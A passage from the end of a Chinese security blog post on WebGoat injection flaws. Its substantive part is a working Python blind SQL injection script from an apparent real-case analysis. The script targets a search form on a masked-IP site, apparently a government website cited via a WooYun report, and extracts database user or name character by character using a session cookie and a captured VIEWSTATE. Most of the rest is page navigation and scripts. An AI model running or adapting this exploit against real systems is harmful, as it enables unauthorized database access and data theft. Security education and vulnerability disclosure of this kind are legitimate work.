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PSdjb2xvcjpyZWQ7Jz4oMjcpPC9zcGFuPh8NBQI3NR8OaGQUKwACFgYfAAVqPGEgdGl0bGU9J+WKnuS6i+aMh+WNlycgb25jbGljaz0iTWVudSh0aGlzLCfkuLvpopgtJykiPuWKnuS6i+aMh+WNlzwvYT48c3BhbiBzdHlsZT0nY29sb3I6cmVkOyc+KDgpPC9zcGFuPh8NBQIxMB8OaGQUKwACFgYfAAVePGEgdGl0bGU9J+WFtuS7licgb25jbGljaz0iTWVudSh0aGlzLCfkuLvpopgtJykiPuWFtuS7ljwvYT48c3BhbiBzdHlsZT0nY29sb3I6cmVkOyc+KDgpPC9zcGFuPh8NBQIxMx8OaGRkAgUPFgIfBwUTdG9uZ2ppIEVTU0VtcHR5UGFuZWQCDA8UKwACFCsAA2RkZGRkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYDBSBlc3MkY3RyMjQ0MzckYmpoX01lbnUkaWJ0blNlYXJjaAU5ZXNzJGN0cjI0NDM3JGJqaF9NZW51JGdyZEFwcGx5Rm9yUHVibGljJGN0bDAyJGNoa0FsbEluQm94BSxlc3MkY3RyMjQ0MzckYmpoX01lbnUkdHJHdWlkZVN1YmplY3RDbGFzc2lmeQ=="""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#其实把这一坨写在其他文件里，就不会这么恶心了。。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payloads = list('abcdefghijklmnopqrstuvwxyz0123456789!@<span class="comment">#$%^&amp;*()_+=-&lt;&gt;,./?;:[]&#123;&#125;\|')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print('CIRC mssql injection begins now!')</span><br><span class="line"></span><br><span class="line">target = raw_input('What <span class="keyword">do</span> you want to know?(<span class="string">"user_name()"</span>, <span class="string">"db_name()"</span>):') <span class="comment">#有没有很贴心~</span></span><br><span class="line"></span><br><span class="line">result = ''</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">15</span>): <span class="comment">#事先要用len()试出来要查询内容的长度，其实可以自动化，懒得写了。。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</span><br><span class="line"></span><br><span class="line">        queryinfo = <span class="string">"%%' and ascii(substring((select %s),%s,1))=%s--"</span> % (target, i, ord(payload))</span><br><span class="line"></span><br><span class="line">        body=<span class="string">"""\r\n\r\n-----------------------------4007811431419953409171175952\r\nContent-Disposition: form-data; name="__VIEWSTATE"\r\n\r\n"""</span> + viewstate + <span class="string">"""\r\n-----------------------------4007811431419953409171175952\r\nContent-Disposition: form-data; name="ess<span class="variable">$ctr24437</span><span class="variable">$bjh_Menu</span><span class="variable">$txtNeedOtherInfo</span>"\r\n\r\n"""</span> + queryinfo + <span class="string">"""\r\n-----------------------------4007811431419953409171175952\r\nContent-Disposition: form-data; name="ess<span class="variable">$ctr24437</span><span class="variable">$bjh_Menu</span><span class="variable">$ibtnSearch</span>.x"\r\n\r\n1\r\n-----------------------------4007811431419953409171175952\r\nContent-Disposition: form-data; name="ess<span class="variable">$ctr24437</span><span class="variable">$bjh_Menu</span><span class="variable">$ibtnSearch</span>.y"\r\n\r\n1\r\n-----------------------------4007811431419953409171175952\r\nContent-Disposition: form-data; name="ess<span class="variable">$ctr24437</span><span class="variable">$bjh_Menu</span><span class="variable">$hidType</span>"\r\n\r\n公开\r\n-----------------------------4007811431419953409171175952--\r\n"""</span></span><br><span class="line"></span><br><span class="line">        req=urllib2.Request('http://**.**.**.**/tabid/<span class="number">5272</span>/Default.aspx', data=body)</span><br><span class="line"></span><br><span class="line">        req.add_header('Content-<span class="built_in">Type</span><span class="string">','</span>multipart/form-data;boundary=---------------------------<span class="number">4007811431419953409171175952</span>')</span><br><span class="line"></span><br><span class="line">        req.add_header('Cookie',mycookie)</span><br><span class="line"></span><br><span class="line">        resp = urllib2.urlopen(req,timeout=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">        respstr = resp.read()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> respstr.find('<span class="number">123</span>asd') != -<span class="number">1</span>:</span><br><span class="line"></span><br><span class="line">            result += payload</span><br><span class="line"></span><br><span class="line">            sys.stdout.write('\r\n[Guessing] %s' % result)</span><br><span class="line"></span><br><span class="line">            sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print('\r\n[Succeed]The result is: '+result)</span><br></pre></td></tr></table></figure></p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] <a href="http://qimingyu.com/2016/05/06/Webgoat%E4%B9%8BInjection_Flaws/" target="_blank" rel="external">Webgoat之Injection Flaws</a><br>[2] <a href="http://www.wooyun.org/bugs/wooyun-2015-0133642/" target="_blank" rel="external">中国某部委主网站SQL盲注</a></p>
+
+      
+    </div>
+
+    <div class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透测试/"> #渗透测试 </a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/07/14/webgoat-insecure-communication/">WebGoat Day3 Insecure Communication</a>
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/07/14/webgoat-error-handling/">WebGoat Day3 Improper Error Handling</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </div>
+  </div>
+
+
+
+    
+      <div class="post-spread">
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      </div>
+    
+
+    
+      <div class="comments" id="comments">
+        
+          <div class="ds-thread" data-thread-key="2016/07/14/webgoat-injection/"
+               data-title="WebGoat Day3 Injection Flaws" data-url="http://blkstone.github.io/2016/07/14/webgoat-injection/">
+          </div>
+        
+      </div>
+    
+  </div>
+
+
+        </div>
+
+        
+      </div>
+
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <div class="site-overview">
+        <div class="site-author motion-element">
+          <img class="site-author-image" src="/images/avatar.jpg" alt="Ray" />
+          <p class="site-author-name">Ray</p>
+        </div>
+        <p class="site-description motion-element">关于计算机科学的学习经历与精彩文章分享。</p>
+        <div class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">216</span>
+              <span class="site-state-item-name">文章</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">13</span>
+              <span class="site-state-item-name">分類</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">75</span>
+              <span class="site-state-item-name">標籤</span>
+              </a>
+          </div>
+
+        </div>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+              <a href="https://github.com/BLKStone" target="_blank">GitHub</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Twitter</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">Weibo</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">DouBan</a>
+            </span>
+            
+              <span class="links-of-author-item">
+              <a href="http://blkstone.github.io/" target="_blank">ZhiHu</a>
+            </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element">
+            <a href="http://creativecommons.org/licenses/by-nc-sa/4.0" class="cc-opacity" target="_blank">
+              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+      </div>
+
+      
+        <div class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Command-Injection"><span class="nav-number">1.</span> <span class="nav-text">Command Injection</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Numeric-SQL-Injection"><span class="nav-number">2.</span> <span class="nav-text">Numeric SQL Injection</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#String-SQL-Injection"><span class="nav-number">3.</span> <span class="nav-text">String SQL Injection</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Blind-Numeric-SQL-Injection"><span class="nav-number">4.</span> <span class="nav-text">Blind Numeric SQL Injection</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Blind-String-SQL-Injection"><span class="nav-number">5.</span> <span class="nav-text">Blind String SQL Injection</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#LAB-SQL-Injection"><span class="nav-number">6.</span> <span class="nav-text">LAB: SQL Injection</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Stage-1"><span class="nav-number">6.1.</span> <span class="nav-text">Stage 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Stage-2"><span class="nav-number">6.2.</span> <span class="nav-text">Stage 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Stage-3"><span class="nav-number">6.3.</span> <span class="nav-text">Stage 3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Stage-4"><span class="nav-number">6.4.</span> <span class="nav-text">Stage 4</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Database-Backdoors"><span class="nav-number">7.</span> <span class="nav-text">Database Backdoors</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Stage-1-1"><span class="nav-number">7.1.</span> <span class="nav-text">Stage 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Stage-2-1"><span class="nav-number">7.2.</span> <span class="nav-text">Stage 2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Log-Spoofing"><span class="nav-number">8.</span> <span class="nav-text">Log Spoofing</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#一则真实案例分析"><span class="nav-number">9.</span> <span class="nav-text">一则真实案例分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考资料"><span class="nav-number">10.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </div>
+      
+
+    </div>
+  </div>
+
+
+    </div>
+
+    <div id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy; &nbsp;  2015 - 
+  2016
+  <span class="with-love">
+    <i class="icon-heart"></i>
+  </span>
+  <span class="author">Ray</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="http://hexo.io">Hexo</a> 強力驅動
+</div>
+
+<div class="theme-info">
+  主題 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+
+      </div>
+    </div>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.3"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.3"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.3" id="motion.global"></script>
+
+
+
+  <script type="text/javascript" src="/js/search-toggle.js"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.3" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var $sidebarInner = $('.sidebar-inner');
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.didShow', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+          var self = this;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      $(indicator).velocity('stop').velocity({
+        opacity: action === 'show' ? 0.4 : 0
+      }, { duration: 100 });
+    }
+
+  });
+</script>
+
+
+  <script type="text/javascript" id="sidebar.nav">
+    $(document).ready(function () {
+      var html = $('html');
+
+      $('.sidebar-nav li').on('click', function () {
+        var item = $(this);
+        var activeTabClassName = 'sidebar-nav-active';
+        var activePanelClassName = 'sidebar-panel-active';
+        if (item.hasClass(activeTabClassName)) {
+          return;
+        }
+
+        var currentTarget = $('.' + activePanelClassName);
+        var target = $('.' + item.data('target'));
+
+        currentTarget.velocity('transition.slideUpOut', 200, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', 200)
+            .addClass(activePanelClassName);
+        });
+
+        item.siblings().removeClass(activeTabClassName);
+        item.addClass(activeTabClassName);
+      });
+
+      $('.post-toc a').on('click', function (e) {
+        e.preventDefault();
+        var offset = $(escapeSelector(this.getAttribute('href'))).offset().top;
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        });
+      });
+
+      // Expand sidebar on post detail page by default, when post has a toc.
+      var $tocContent = $('.post-toc-content');
+      if (isDesktop() && CONFIG.sidebar === 'post') {
+        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+          displaySidebar();
+        }
+      }
+    });
+  </script>
+
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+    });
+  </script>
+
+  
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+      processEscapes: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for (i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+  
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"blkstone"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+
+
+  
+  
+
+</body>
+</html>
